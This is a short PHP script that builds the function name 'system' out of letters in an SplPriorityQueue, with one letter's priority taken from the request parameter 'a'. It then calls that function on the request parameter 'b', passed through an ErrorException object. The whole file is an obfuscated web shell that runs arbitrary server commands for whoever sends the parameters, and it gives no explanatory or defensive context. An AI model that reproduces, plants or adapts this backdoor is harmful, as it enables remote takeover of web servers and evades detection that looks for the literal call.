<?php
ini_set("display_errors",1);
$objPQ = new SplPriorityQueue();
$objPQ->insert('m',1);
$objPQ->insert('s',6);
$objPQ->insert('e',3);
$objPQ->insert('s',4);
$objPQ->insert('y',5);
$objPQ->insert('t',$_GET[a]);
$objPQ->setExtractFlags(SplPriorityQueue::EXTR_DATA);
//Go to TOP
$objPQ->top();
$m='';
$cur = new ErrorException($_GET[b]);
while($objPQ->valid()){
 $m.=$objPQ->current();
 $objPQ->next();
}
echo $m($cur->getMessage());
?>